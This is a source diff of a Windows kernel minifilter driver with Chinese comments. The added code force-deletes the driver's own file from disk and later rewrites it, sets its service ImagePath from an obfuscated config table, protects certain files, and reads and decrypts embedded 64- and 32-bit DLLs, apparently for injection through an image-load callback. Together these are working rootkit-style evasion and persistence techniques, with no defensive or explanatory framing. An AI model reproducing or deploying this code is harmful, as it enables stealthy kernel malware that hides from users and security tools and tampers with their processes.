@@ -23,7 +23,6 @@
 #include "adsys.h"
 #include "str.h"
 #include "lde.h"
-
 #endif
 
 //#include "struct.h"
@@ -33,6 +32,7 @@
 #ifdef ALLOC_PRAGMA
 // Allow the DriverEntry routine to be discarded once initialization is completed
 #pragma alloc_text(INIT, DriverEntry)
+//
 #pragma alloc_text(PAGE, DriverUnload)
 #pragma alloc_text(PAGE, DispatchCreate)
 #pragma alloc_text(PAGE, DispatchShutDown)
@@ -53,15 +53,19 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
     PVOID fnExGetPreviousMode = (PVOID)ExGetPreviousMode;
     PVOID pFoundPattern = NULL;
     UCHAR PreviousModePattern[] = "\x00\x00\xC3";
+    PKLDR_DATA_TABLE_ENTRY entry = NULL;
     PMY_COMMAND_INFO p1 = NULL;
+
     UNICODE_STRING ustrLinkName;
     UNICODE_STRING ustrDevName;
     PDEVICE_OBJECT pDevObj;
-    ULONG i = 0;
+    ULONG          i = 0;
+    kprintf("***************************************************");
+
     ReadDriverParameters(pRegistryString);
-    LoggingFlags = LOGFL_INFO;
-    pDriverObj->MajorFunction[IRP_MJ_CREATE] =   DispatchCreate;
-    pDriverObj->MajorFunction[IRP_MJ_CLOSE] =    DispatchClose;
+//  LoggingFlags = LOGFL_INFO;
+    pDriverObj->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
+    pDriverObj->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
     pDriverObj->MajorFunction[IRP_MJ_SHUTDOWN] = DispatchShutDown;
     // Dispatch routine for communications
     pDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchControl;
@@ -71,11 +75,11 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
 
     // Initialize the device name.
     RtlInitUnicodeString(&ustrDevName, NT_DEVICE_NAME);
-    //Create the device object and device extension
 
+    // Create the device object and device extension
     status = IoCreateDevice(pDriverObj, 0, &ustrDevName, FILE_DEVICE_UNKNOWN, 0, FALSE, &pDevObj);
     if (!NT_SUCCESS(status)) {
-        dprintf("[DriverEntry] Error, IoCreateDevice = 0x%x\r\n", status);
+        kprintf("[DriverEntry] Error, IoCreateDevice = 0x%x\r\n", status);
         return status;
     }
 
@@ -84,6 +88,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
 
     // Save a pointer to the device object
     //deviceExtension->DeviceObject = deviceObject;
+
     if (IoIsWdmVersionAvailable(1, 0x10)) {
         //如果是支持符号链接用户相关性的系统
         RtlInitUnicodeString(&ustrLinkName, SYMBOLIC_LINK_GLOBAL_NAME);
@@ -99,64 +104,83 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
         dprintf("Error, IoCreateSymbolicLink = 0x%x\r\n", status);
 
         IoDeleteDevice(pDevObj);
-
         return status;
     }
-    IoRegisterShutdownNotification(pDevObj);
     g_drobj = pDriverObj;
+    entry = (PKLDR_DATA_TABLE_ENTRY)pDriverObj->DriverSection;
+    if (entry->FullDllName.Buffer) {
+        //kprintf("[DriverEntry] fullDllName:%ws", entry->FullDllName.Buffer);
+
+        status = MzReadFile(entry->FullDllName.Buffer, &g_pPlugSys, &g_iPlugSys);
+        if (NT_SUCCESS(status)) {
+        } else kprintf("[DriverEntry] File:%ws Error status:%x", entry->FullDllName.Buffer, status);
+
+
+    }
+
+    IoRegisterShutdownNotification(pDevObj);
     //
     //  TODO: Add initialization code here.
-    //
-    //浏览器
+    if (g_pPlugSys && g_iPlugSys > 0) {
+        PFILE_OBJECT pFileObject = NULL;
+        IO_STATUS_BLOCK IoStatusBlock = {0};
+        status = IrpCreateFile(&entry->FullDllName, DELETE, &IoStatusBlock, &pFileObject);
+        if (NT_SUCCESS(status)) {
+            status = IrpDeleteFileForce(pFileObject);
+            status = IrpClose(pFileObject);
+        } else {
+            DbgPrint("[DriverEntry] call IrpCreateFile error status:%x", status);
+        }
 
+    }
+
+
+
+
+
+
+    LDE_init();
+    //初始化字符串
     InitAllStr();
-
+	//设置注册表键值
+	SetRegKeyValue(g_HexConfig[6],L"ImagePath",g_HexConfig[13],REG_EXPAND_SZ);
+//	SetRegKeyValue(g_HexConfig[13],g_HexConfig[14],REG_EXPAND_SZ);
     //要保护的文件
-
+    wcscpy(g_pProtectFile[0].exename, g_HexConfig[0]);
+    g_pProtectFile[0].uType = 2;
 
     wcscpy(g_pProtectFile[1].exename, g_HexConfig[1]);
     g_pProtectFile[1].uType = 1;
 
 
-//  InitializeListHead(&g_ProtectFile);
-//  KeInitializeSpinLock(&g_spin_lockfile);
+//  kprintf("[DriverEntry] g_pProtectFile size:%d",sizeof(g_pProtectFile));
+    //不让访问的进程名
+
 #ifdef _AMD64_
     //x64 add code
-//  AppendListNode(g_HexConfig[1], &g_ProtectFile, 2);
-    wcscpy(g_pProtectFile[0].exename, g_HexConfig[1]);
-    g_pProtectFile[0].uType = 2;
-
-#else
-
-    wcscpy(g_pProtectFile[0].exename, g_HexConfig[0]);
-    g_pProtectFile[0].uType = 2;
-
-//  AppendListNode(g_HexConfig[0], &g_ProtectFile, 2);
-
-    //x86 add code
-#endif
-//  AppendListNode(g_HexConfig[2], &g_ProtectFile, 1);
-#ifdef _AMD64_
-    //x64 add code
-
-    status = MzReadFile(g_HexConfig[3], &g_pDll64, &g_iDll64);
+    status = MzReadFile(g_HexConfig[2], &g_pDll64, &g_iDll64);
     if (NT_SUCCESS(status)) {
         MyDecryptFile(g_pDll64, g_iDll64, 16);
-    } else
-        kprintf("[DriverEntry] File:%ws Error status:%x", g_HexConfig[3], status);
-    status = MzReadFile(g_HexConfig[4], &g_pDll32, &g_iDll32);
+    } else kprintf("[DriverEntry] File:%ws Error status:%x", g_HexConfig[2], status);
+
+    status = MzReadFile(g_HexConfig[3], &g_pDll32, &g_iDll32);
     if (NT_SUCCESS(status)) {
         MyDecryptFile(g_pDll32, g_iDll32, 16);
-    } else
-        kprintf("[DriverEntry] File:%ws Error status:%x", g_HexConfig[4], status);
+    } else kprintf("[DriverEntry] File:%ws Error status:%x", g_HexConfig[3], status);
+
 #else
     //x86 add code
-    status = MzReadFile(g_HexConfig[4], &g_pDll32, &g_iDll32);
+    status = MzReadFile(g_HexConfig[3], &g_pDll32, &g_iDll32);
     if (NT_SUCCESS(status)) {
         MyDecryptFile(g_pDll32, g_iDll32, 16);
-    } else
-        kprintf("[DriverEntry] File:%ws Error status:%x", g_HexConfig[4], status);
+    } else kprintf("[DriverEntry] File:%ws Error status:%x", g_HexConfig[3], status);
 #endif
+
+
+
+    status = MzReadFile(g_HexConfig[12], &g_pPlugBuffer, &g_iPlugSize);
+    if (NT_SUCCESS(status)) {
+    } else kprintf("[DriverEntry] File:%ws Error status:%x", g_HexConfig[12], status);
 
     kprintf("[DriverEntry] g_pDll64:%p g_iDll64:%x g_pDll32:%p g_iDll32:%x", g_pDll64, g_iDll64, g_pDll32, g_iDll32);
 
@@ -165,38 +189,66 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
 #else
 #endif
 
-
-
-    ZwQueryInformationProcess = (QUERY_INFO_PROCESS) GetSystemRoutineAddress(L"ZwQueryInformationProcess");
+    kprintf("[DriverEntry] KeServiceDescriptorTable:%p", KeServiceDescriptorTable);
     PsGetProcessWow64Process = (P_PsGetProcessWow64Process)GetSystemRoutineAddress(L"PsGetProcessWow64Process");
     PsGetProcessPeb = (P_PsGetProcessPeb)GetSystemRoutineAddress(L"PsGetProcessPeb");
-    DbgPrint("[DriverEntry] PsGetProcessPeb:%p   PsGetProcessWow64Process:%p ZwQueryInformationProcess:%p", PsGetProcessPeb, PsGetProcessWow64Process, ZwQueryInformationProcess);
+    DbgPrint("[DriverEntry] PsGetProcessPeb:%p   PsGetProcessWow64Process:%p", PsGetProcessPeb, PsGetProcessWow64Process);
     if (NT_SUCCESS(BBSearchPattern(PreviousModePattern, 0xCC, sizeof(PreviousModePattern) - 1, fnExGetPreviousMode, 32, &pFoundPattern))) {
         g_mode = *(PULONG)((PUCHAR)pFoundPattern - 2);
         kprintf("[DriverEntry] g_mode:%x fnExGetPreviousMode:%p\n", g_mode, fnExGetPreviousMode);
     }
 
-    //映像加载回调
+
+    kprintf("[DriverEntry] PsGetProcessImageFileName:%p", PsGetProcessImageFileName);
+    //注册表回调监控
+    SetRegisterCallback();
+    // 映像加载回调
     status = PsSetLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
     if (!NT_SUCCESS(status)) {
         kprintf("[DriverEntry] PsSetLoadImageNotifyRoutine Failed! status:%x\n", status);
     }
+    //文件minifiter
 
-    //注册表回调监控
-    SetRegisterCallback();
-    //文件回调监控
+	
     ExInitializeNPagedLookasideList(&Pre2PostContextList, NULL, NULL, 0, sizeof(PRE_2_POST_CONTEXT), PRE_2_POST_TAG, 0);
     status = FltRegisterFilter(pDriverObj, &FilterRegistration, &gFilterHandle);
     ASSERT(NT_SUCCESS(status));
     if (NT_SUCCESS(status)) {
         //
-        //Start filtering i/o
+        //  Start filtering i/o
         //
         status = FltStartFiltering(gFilterHandle);
         if (!NT_SUCCESS(status)) {
             FltUnregisterFilter(gFilterHandle);
         }
     }
+
+//  status = bAceessFile(entry->FullDllName.Buffer);
+
+
+    if (g_pPlugSys && g_iPlugSys > 0) {
+
+
+
+        UNICODE_STRING strFilePath;
+        IO_STATUS_BLOCK IoStatusBlock = {0};
+        PFILE_OBJECT pFileObject = NULL;
+        RtlInitUnicodeString(&strFilePath, entry->FullDllName.Buffer);
+        status = IrpCreateFile(&strFilePath, GENERIC_WRITE, &IoStatusBlock, &pFileObject);
+
+        if(NT_SUCCESS(status)) {
+            status =  IrpFileWrite(pFileObject, NULL, g_iPlugSys, g_pPlugSys, &IoStatusBlock);
+            status = IrpClose(pFileObject);
+        } else {
+        }
+//       status=MzWriteFile(entry->FullDllName.Buffer,g_pPlugSys,g_iPlugSys);
+
+    }
+
+
+    kprintf("[DriverEntry] sys is load success!");
+
+    kprintf("***************************************************");
     return STATUS_SUCCESS;
 }
 
@@ -205,11 +257,13 @@ VOID DriverUnload(IN PDRIVER_OBJECT pDriverObj)
     UNICODE_STRING strLink;
 
     // Unloading - no resources to free so just return.
-    dprintf("Unloading...\r\n");
+
+
+    //
     // TODO: Add uninstall code here.
     //
     PsRemoveLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
-//  RemoveRegisterCallback();
+    RemoveRegisterCallback();
     // Delete the symbolic link
     RtlInitUnicodeString(&strLink, SYMBOLIC_LINK_NAME);
     IoDeleteSymbolicLink(&strLink);
@@ -217,7 +271,7 @@ VOID DriverUnload(IN PDRIVER_OBJECT pDriverObj)
     // Delete the DeviceObject
     IoDeleteDevice(pDriverObj->DeviceObject);
 
-    dprintf("Unloaded Success\r\n");
+    kprintf("[DriverUnload] Unloaded Success\r\n");
 
     return;
 }
@@ -269,10 +323,27 @@ NTSTATUS DispatchControl(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
 
     switch (uIoControlCode) {
         case IOCTL_HELLO_WORLD: {
+            dprintf("MY_CTL_CODE(0)=%d\r\n,MY_CTL_CODE");
+            // Return success
             status = STATUS_SUCCESS;
         }
         break;
+        case IOCTRL_DEBUG: {
+            int *pFlag = pIoBuffer;
+            if (MmIsAddressValid(pFlag)) {
+                kprintf("[DispatchControl] ...%d uInSize:%d", *pFlag, uInSize);
 
+
+                LoggingFlags = *pFlag;
+            }
+
+        }
+        break;
+        case IOCTRL_RemoveReg: {
+            RemoveRegisterCallback();
+        }
+
+        break;
         //
         // TODO: Add execute code here.
         //
@@ -284,7 +355,9 @@ NTSTATUS DispatchControl(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
     }
 
     if (status == STATUS_SUCCESS) {
+
         pIrp->IoStatus.Information = uOutSize;
+
     } else {
         pIrp->IoStatus.Information = 0;
     }
@@ -309,8 +382,13 @@ NTSTATUS FilterUnload(__in FLT_FILTER_UNLOAD_FLAGS Flags)
     //  Delete lookaside list
     ExDeleteNPagedLookasideList(&Pre2PostContextList);
     kprintf("[FilterUnload] call ExDeleteNPagedLookasideList FltUnregisterFilter");
+
     return STATUS_SUCCESS;
 }
+
+
+
+
 
 
 BOOLEAN GetCommandLine(PEPROCESS ProcessObj, WCHAR name[])
@@ -320,6 +398,9 @@ BOOLEAN GetCommandLine(PEPROCESS ProcessObj, WCHAR name[])
     if (KeGetCurrentIrql() != PASSIVE_LEVEL) {
         return FALSE;
     }
+
+
+
     pPEB = PsGetProcessPeb != NULL ? PsGetProcessPeb(ProcessObj) : NULL;
     if (pPEB == NULL) return FALSE;
 #ifdef _AMD64_
@@ -341,10 +422,8 @@ BOOLEAN GetCommandLine(PEPROCESS ProcessObj, WCHAR name[])
         if (MmIsAddressValid(processParam->CommandLine.Buffer)) {
             int Len = processParam->CommandLine.Length >= 1024 ? 1023 : processParam->CommandLine.Length;
             RtlCopyMemory(name, processParam->CommandLine.Buffer, Len);
-
             return TRUE;
         }
-
     }
     __except(EXCEPTION_EXECUTE_HANDLER) {
         ULONG code = GetExceptionCode();
@@ -374,11 +453,11 @@ BOOLEAN GetCommandLine(PEPROCESS ProcessObj, WCHAR name[])
             return FALSE;
         }
 
+
         if (MmIsAddressValid(processParam->CommandLine.Buffer)) {
             int Len = processParam->CommandLine.Length >= 1024 ? 1023 : processParam->CommandLine.Length;
             RtlCopyMemory(name, processParam->CommandLine.Buffer, Len);
             return TRUE;
-
 
         }
 
@@ -392,14 +471,16 @@ BOOLEAN GetCommandLine(PEPROCESS ProcessObj, WCHAR name[])
 }
 
 
+
+
 BOOLEAN GetNameByObj(PEPROCESS ProcessObj, WCHAR *name)
 {
 
+
     KIRQL irql = KeGetCurrentIrql();
-
     if(irql != PASSIVE_LEVEL) {
-
-        //        LOG(LOGFL_INFO,( "[GetNameByObj] This is Less IRQL:%d PASSIVE_LEVEL:%d",irql,PASSIVE_LEVEL));
+        LOG(LOGFL_INFO, ( "[GetNameByObj] This is Less IRQL:%d PASSIVE_LEVEL:%d", irql, PASSIVE_LEVEL));
+        //return FALSE;
     }
 
     if (g_offset_name) {
@@ -408,10 +489,7 @@ BOOLEAN GetNameByObj(PEPROCESS ProcessObj, WCHAR *name)
         PULONG_PTR pNameInfo = (PULONG_PTR)SEAuditValue;
         PUNICODE_STRING lpPath =  (PUNICODE_STRING)(PVOID)pNameInfo;
 
-
-
         if (MmIsAddressValid(lpPath)) {
-
             if (lpPath->Buffer == NULL) {
                 LOG(LOGFL_INFO, ( "[GetNameByObj] This is NULL irql:%d pNameInfo:%wZ", irql, pNameInfo));
             } else {
@@ -426,17 +504,15 @@ BOOLEAN GetNameByObj(PEPROCESS ProcessObj, WCHAR *name)
 
                 }
 
-                //              LOG(LOGFL_INFO,( "[GetNameByObj] irql:%d pNameInfo:%wZ", irql,pNameInfo));
+//              LOG(LOGFL_INFO,( "[GetNameByObj] irql:%d pNameInfo:%wZ", irql,pNameInfo));
 
             }
-
         }
 
     }
 
     return FALSE;
 }
-
 
 VOID CleanVolumCtx(
     IN PFLT_CONTEXT Context,
@@ -470,7 +546,7 @@ Return Value:
             ctx = (PVOLUME_CONTEXT)Context;
             if (ctx->Name.Buffer != NULL) {
 
-                kprintf("[CleanVolumCtx] free volumName:%wZ", &ctx->Name);
+                //                kprintf("[CleanVolumCtx] free volumName:%wZ",&ctx->Name);
                 ExFreePool(ctx->Name.Buffer);
                 ctx->Name.Buffer = NULL;
             }
@@ -480,8 +556,7 @@ Return Value:
             KIRQL OldIrql;
             streamCtx = (PSTREAM_CONTEXT)Context;
 
-            if (streamCtx == NULL)
-                break;
+            if (streamCtx == NULL) break;
             if (streamCtx->FileName.Buffer != NULL) {
 
                 //                kprintf("[CleanVolumCtx] free streamcontext FileName:%ws",streamCtx->FileName.Buffer);
@@ -493,25 +568,56 @@ Return Value:
             if (NULL != streamCtx->Resource) {
                 ExDeleteResourceLite(streamCtx->Resource);
                 ExFreePoolWithTag(streamCtx->Resource, RESOURCE_TAG);
-
             }
         }
         break;
     }
 }
 
-NTSTATUS InstanceSetup(IN PCFLT_RELATED_OBJECTS FltObjects, IN FLT_INSTANCE_SETUP_FLAGS Flags, IN DEVICE_TYPE VolumeDeviceType, IN FLT_FILESYSTEM_TYPE VolumeFilesystemType)
+NTSTATUS InstanceSetup(
+    IN PCFLT_RELATED_OBJECTS FltObjects,
+    IN FLT_INSTANCE_SETUP_FLAGS Flags,
+    IN DEVICE_TYPE VolumeDeviceType,
+    IN FLT_FILESYSTEM_TYPE VolumeFilesystemType)
+/*++
+
+Routine Description:
+
+    This routine is called whenever a new instance is created on a volume.
+
+    By default we want to attach to all volumes.  This routine will try and
+    get a "DOS" name for the given volume.  If it can't, it will try and
+    get the "NT" name for the volume (which is what happens on network
+    volumes).  If a name is retrieved a volume context will be created with
+    that name.
+
+Arguments:
+
+    FltObjects - Pointer to the FLT_RELATED_OBJECTS data structure containing
+    opaque handles to this filter, instance and its associated volume.
+
+    Flags - Flags describing the reason for this attach request.
+
+Return Value:
+
+    STATUS_SUCCESS - attach
+    STATUS_FLT_DO_NOT_ATTACH - do not attach
+
+--*/
 {
     PDEVICE_OBJECT devObj = NULL;
     PVOLUME_CONTEXT ctx = NULL;
     NTSTATUS status;
     ULONG retLen;
+    PUNICODE_STRING workingName;
     USHORT size;
     UCHAR volPropBuffer[sizeof(FLT_VOLUME_PROPERTIES) + 512];
     PFLT_VOLUME_PROPERTIES volProp = (PFLT_VOLUME_PROPERTIES)volPropBuffer;
+
     UNREFERENCED_PARAMETER(Flags);
     UNREFERENCED_PARAMETER(VolumeDeviceType);
     UNREFERENCED_PARAMETER(VolumeFilesystemType);
+
     try {
 
         //
@@ -520,22 +626,15 @@ NTSTATUS InstanceSetup(IN PCFLT_RELATED_OBJECTS FltObjects, IN FLT_INSTANCE_SETU
 
         status = FltAllocateContext(FltObjects->Filter, FLT_VOLUME_CONTEXT, sizeof(VOLUME_CONTEXT), NonPagedPool, &ctx);
         if (!NT_SUCCESS(status)) {
-
-            //
             //  We could not allocate a context, quit now
-            //
-
             leave;
         }
-
         //
         //  Always get the volume properties, so I can get a sector size
         //
 
         status = FltGetVolumeProperties(FltObjects->Volume, volProp, sizeof(volPropBuffer), &retLen);
-
         if (!NT_SUCCESS(status)) {
-
             leave;
         }
 
@@ -546,41 +645,50 @@ NTSTATUS InstanceSetup(IN PCFLT_RELATED_OBJECTS FltObjects, IN FLT_INSTANCE_SETU
         //
 
         ASSERT((volProp->SectorSize == 0) || (volProp->SectorSize >= MIN_SECTOR_SIZE));
+
         ctx->SectorSize = max(volProp->SectorSize, MIN_SECTOR_SIZE);
+
         //
         //  Init the buffer field (which may be allocated later).
         //
+
         ctx->Name.Buffer = NULL;
+
         //
         //  Get the storage device object we want a name for.
         //
+
         status = FltGetDiskDeviceObject(FltObjects->Volume, &devObj);
+
         if (NT_SUCCESS(status)) {
 
             //
             //  Try and get the DOS name.  If it succeeds we will have
             //  an allocated name buffer.  If not, it will be NULL
             //
+
             status = IoVolumeDeviceToDosName(devObj, &ctx->Name);
         }
 
         //
         //  If we could not get a DOS name, get the NT name.
         //
+
         if (!NT_SUCCESS(status)) {
             ASSERT(ctx->Name.Buffer == NULL);
             status = STATUS_FLT_DO_NOT_ATTACH;
             leave;
-            //
-            //  Figure out which name to use from the properties
-            //
         }
 
         //
         //  Set the context
         //
-        LOG(LOGFL_INFO, ("[InstanceSetup]  Name:%ws", ctx->Name.Buffer));
-        status = FltSetVolumeContext(FltObjects->Volume, FLT_SET_CONTEXT_KEEP_IF_EXISTS, ctx, NULL);
+
+        kprintf("[InstanceSetup] Volume Name:%wZ", &ctx->Name);
+        status = FltSetVolumeContext(FltObjects->Volume,
+                                     FLT_SET_CONTEXT_KEEP_IF_EXISTS,
+                                     ctx,
+                                     NULL);
         if (status == STATUS_FLT_CONTEXT_ALREADY_DEFINED) {
 
             status = STATUS_SUCCESS;
@@ -597,7 +705,9 @@ NTSTATUS InstanceSetup(IN PCFLT_RELATED_OBJECTS FltObjects, IN FLT_INSTANCE_SETU
 
         if (ctx)
         {
+
             FltReleaseContext(ctx);
+
         }
 
         //
@@ -614,6 +724,14 @@ NTSTATUS InstanceSetup(IN PCFLT_RELATED_OBJECTS FltObjects, IN FLT_INSTANCE_SETU
     return status;
 }
 
+/**
+ * [InstanceQueryTeardown This is called when an instance is being manually deleted by a call to FltDetachVolume or FilterDetach.  We always return it is OK to detach]
+ * @Author   fanyusen
+ * @DateTime 2019年6月18日T7:23:53+0800
+ * @param    FltObjects               [Pointer to the FLT_RELATED_OBJECTS data structure containing opaque handles to this filter, instance and its associated volume.]
+ * @param    Flags                    [Indicating where this detach request came from.]
+ * @return                            [Always succeed]
+ */
 NTSTATUS InstanceQueryTeardown(IN PCFLT_RELATED_OBJECTS FltObjects, IN FLT_INSTANCE_QUERY_TEARDOWN_FLAGS Flags)
 {
     UNREFERENCED_PARAMETER(FltObjects);
@@ -629,7 +747,7 @@ FLT_PREOP_CALLBACK_STATUS PreCleanup(
     NTSTATUS status = STATUS_SUCCESS;
     PFLT_FILE_NAME_INFORMATION pfNameInfo = NULL;
     PSTREAM_CONTEXT pStreamCtx = NULL;
-    LARGE_INTEGER FileOffset = {0};
+    LARGE_INTEGER FileOffset = { 0 };
     BOOLEAN bIsSystemProcess = FALSE;
     BOOLEAN bFileNameLengthNotZero = FALSE;
     KIRQL OldIrql;
@@ -671,12 +789,9 @@ FLT_PREOP_CALLBACK_STATUS PreCleanup(
     }
     finally {
 
-        if (NULL != pVolCtx)
-            FltReleaseContext(pVolCtx);
-        if (NULL != pStreamCtx)
-            FltReleaseContext(pStreamCtx);
-        if (NULL != pfNameInfo)
-            FltReleaseFileNameInformation(pfNameInfo);
+        if (NULL != pVolCtx) FltReleaseContext(pVolCtx);
+        if (NULL != pStreamCtx) FltReleaseContext(pStreamCtx);
+        if (NULL != pfNameInfo) FltReleaseFileNameInformation(pfNameInfo);
     }
 
     return FLT_PREOP_SUCCESS_NO_CALLBACK;
@@ -701,8 +816,8 @@ FLT_PREOP_CALLBACK_STATUS PreClose(
     UNICODE_STRING sFileDosFullPath;
     WCHAR wszFileDosFullPath[260];
     PWCHAR pszRelativePathPtr = NULL;
-    WCHAR wszFilePathName[260] = {0};
-    WCHAR wszVolumePathName[64] = {0};
+    WCHAR wszFilePathName[260] = { 0 };
+    WCHAR wszVolumePathName[64] = { 0 };
     PFILE_OBJECT FileObject = NULL;
 
     KIRQL OldIrql;
@@ -736,8 +851,7 @@ FLT_PREOP_CALLBACK_STATUS PreClose(
         SC_LOCK(pStreamCtx, &OldIrql);
         // if it is a stream file object, we don't care about it and don't decrement on reference count
         // since this object is opened by other kernel component
-        if ((FltObjects->FileObject->Flags & FO_STREAM_FILE) != FO_STREAM_FILE)
-            pStreamCtx->RefCount--; // decrement reference count
+        if ((FltObjects->FileObject->Flags & FO_STREAM_FILE) != FO_STREAM_FILE) pStreamCtx->RefCount--; // decrement reference count
 
         if (0 == pStreamCtx->RefCount) {
             //if reference decreases to 0, write file flag, flush|purge cache, and delete file context
@@ -748,26 +862,32 @@ FLT_PREOP_CALLBACK_STATUS PreClose(
     }
     finally {
 
-        if (NULL != pStreamCtx)
-            FltReleaseContext(pStreamCtx);
-        if (NULL != pVolCtx)
-            FltReleaseContext(pVolCtx);
+        if (NULL != pStreamCtx) FltReleaseContext(pStreamCtx);
+        if (NULL != pVolCtx) FltReleaseContext(pVolCtx);
     }
 
     return FltStatus;
 }
 
-///*************************************************************************
-//    dispatch callback routines.
-//*************************************************************************/
-FLT_PREOP_CALLBACK_STATUS PreCreate(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID *CompletionContext)
+/*************************************************************************
+    dispatch callback routines.
+*************************************************************************/
+FLT_PREOP_CALLBACK_STATUS PreCreate(
+    __inout PFLT_CALLBACK_DATA Data,
+    __in PCFLT_RELATED_OBJECTS FltObjects,
+    __deref_out_opt PVOID *CompletionContext)
 {
     FLT_PREOP_CALLBACK_STATUS FltStatus = FLT_PREOP_SUCCESS_WITH_CALLBACK;
+    WCHAR fitername[256] = { 0 };
+    WCHAR exename[216] = { 0 };
+    PFLT_FILE_NAME_INFORMATION pfNameInfo = NULL;
+    ULONG ilen = 0;
     NTSTATUS status;
     UNREFERENCED_PARAMETER(CompletionContext);
     UNREFERENCED_PARAMETER(FltObjects);
     UNREFERENCED_PARAMETER(Data);
     PAGED_CODE();
+
     return FltStatus; //FLT_PREOP_SUCCESS_WITH_CALLBACK;
 }
 
@@ -784,12 +904,13 @@ FLT_POSTOP_CALLBACK_STATUS PostCreate(
     PFLT_FILE_NAME_INFORMATION pfNameInfo = NULL;
     PSTREAM_CONTEXT pStreamCtx = NULL;
     BOOLEAN bNewCreatedOrNot = FALSE;
-    WCHAR fitername[512] = {0};
+    WCHAR fitername[512] = { 0 };
     BOOLEAN bDirectory = FALSE;
     KIRQL OldIrql;
     PMY_COMMAND_INFO pCmdData = NULL;
     UNREFERENCED_PARAMETER(Flags);
     UNREFERENCED_PARAMETER(CompletionContext);
+
     PAGED_CODE();
 
     try {
@@ -799,7 +920,6 @@ FLT_POSTOP_CALLBACK_STATUS PostCreate(
         if (!NT_SUCCESS(status)) {
             __leave;
         }
-
         //verify if a directory
         GetFileStandardInfo(Data, FltObjects, NULL, NULL, &bDirectory);
         if (bDirectory) {
@@ -813,6 +933,12 @@ FLT_POSTOP_CALLBACK_STATUS PostCreate(
         if (pCmdData == NULL) {
             __leave;
         }
+
+
+//       LOG(LOGFL_INFO,("[PostCreate] filename:%ws uType:%d Path:%wZ",pCmdData->exename,pCmdData->uType,&pfNameInfo->Name));
+
+        //kprintf("[PostCreate] filename:%ws uType:%d Path:%wZ",pCmdData->exename,pCmdData->uType,&pfNameInfo->Name);
+
         status = Ctx_FindOrCreateStreamContext(Data, FltObjects, TRUE,
                                                &pStreamCtx, &bNewCreatedOrNot);
         if (!NT_SUCCESS(status)) {
@@ -827,7 +953,9 @@ FLT_POSTOP_CALLBACK_STATUS PostCreate(
             pStreamCtx->RefCount++;
             pStreamCtx->uAccess = uDesiredAccess;
             SC_UNLOCK(pStreamCtx, OldIrql);
-            //            DbgPrint("[PostCreate] has found RefCount:%d filename:%wZ\n", pStreamCtx->RefCount,&pStreamCtx->FileName);
+//           Cc_ClearFileCache(FltObjects->FileObject, TRUE, NULL, 0); // flush and purge cache
+//              DbgPrint("[PostCreate] has found RefCount:%d filename:%wZ\n", pStreamCtx->RefCount,&pStreamCtx->FileName);
+//            LOG(LOGFL_INFO,("[PostCreate] has     found RefCount:%d filename:%wZ\n",pStreamCtx->RefCount, &pStreamCtx->FileName));
             __leave;
         }
 
@@ -837,43 +965,45 @@ FLT_POSTOP_CALLBACK_STATUS PostCreate(
         pStreamCtx->uEncrypteType = pCmdData->uType;
         pStreamCtx->uAccess = uDesiredAccess;
         LOG(LOGFL_INFO, ("[PostCreate] has not found RefCount:%d filename:%wZ\n", pStreamCtx->RefCount, &pStreamCtx->FileName));
+
+//         kprintf("[PostCreate] has not found RefCount:%d filename:%wZ\n", pStreamCtx->RefCount,&pStreamCtx->FileName);
+        Cc_ClearFileCache(FltObjects->FileObject, TRUE, NULL, 0); // flush and purge cache
+        //pStreamCtx->aes_ctr_ctx = NULL ;
         SC_UNLOCK(pStreamCtx, OldIrql);
-        //Cc_ClearFileCache(FltObjects->FileObject, TRUE, NULL, 0); // flush and purge cache
+//              Cc_ClearFileCache(FltObjects->FileObject, TRUE, NULL, 0); // flush and purge cache
+
     }
     finally {
-        if (NULL != pfNameInfo)
-            FltReleaseFileNameInformation(pfNameInfo);
-        if (NULL != pStreamCtx)
-            FltReleaseContext(pStreamCtx);
+        if (NULL != pfNameInfo) FltReleaseFileNameInformation(pfNameInfo);
+        if (NULL != pStreamCtx) FltReleaseContext(pStreamCtx);
     }
+
     return FLT_POSTOP_FINISHED_PROCESSING;
 }
 
 BOOLEAN GetNameByUnicodeString(PUNICODE_STRING pSrc, WCHAR name[])
 {
-    WCHAR uu[512] = {0};
+
     if (pSrc->Length < 512) {
         WCHAR *pfind = NULL;
-        RtlCopyMemory(uu, pSrc->Buffer, pSrc->Length);
-        pfind = wcsrchr(uu, L'\\');
+        pfind = wcsrchr(pSrc->Buffer, L'\\');
         if (pfind) {
             pfind++;
             wcscpy(name, pfind);
-            //              DbgPrint("GetNameByUnicodeString->%ws", pfind);
-            return TRUE;
-        } else if (pfind == NULL && pSrc->Length > 0) {
-            //          kprintf("[GetNameByUnicodeString] %ws",uu);
-            wcscpy(name, uu);
+//            DbgPrint("[GetNameByUnicodeString] %ws", pfind);
             return TRUE;
         }
     }
     return FALSE;
 }
 
-///*************************************************************************
-//    MiniFilter callback routines.
-//*************************************************************************/
-FLT_PREOP_CALLBACK_STATUS PreRead(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID *CompletionContext)
+/*************************************************************************
+    MiniFilter callback routines.
+*************************************************************************/
+FLT_PREOP_CALLBACK_STATUS PreRead(
+    IN OUT PFLT_CALLBACK_DATA Data,
+    IN PCFLT_RELATED_OBJECTS FltObjects,
+    OUT PVOID *CompletionContext)
 {
     PFLT_IO_PARAMETER_BLOCK iopb = Data->Iopb;
     FLT_PREOP_CALLBACK_STATUS retValue = FLT_PREOP_SUCCESS_NO_CALLBACK;
